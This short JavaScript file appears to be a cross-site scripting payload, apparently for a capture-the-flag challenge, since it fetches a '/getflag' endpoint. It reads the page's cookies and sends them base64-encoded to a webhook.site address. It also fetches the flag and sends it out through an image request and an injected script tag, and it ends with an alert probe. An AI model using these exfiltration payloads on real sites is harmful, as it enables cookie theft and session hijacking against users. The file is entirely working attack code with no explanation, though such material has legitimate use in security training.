var cookie = document.cookie;
fetch("https://webhook.site/8bfc556c-6584-4e6e-8a23-980d42dc97c0?"+window.btoa(cookie));

fetch("/getflag")
  .then(res => res.text())
  .then(flag => {
    // 用 image 方式外傳資料
    new Image().src = "https://webhook.site/8b729a46-da4b-4b79-b5a5-9b6d53bac06d?" + btoa(flag);
  });

fetch("/getflag")
  .then(res => res.text())
  .then(flag => {
    let s = document.createElement('script');
    s.src = "https://webhook.site/8b729a46-da4b-4b79-b5a5-9b6d53bac06d?" + btoa(flag);
    document.body.appendChild(s);
  });

alert(7777);
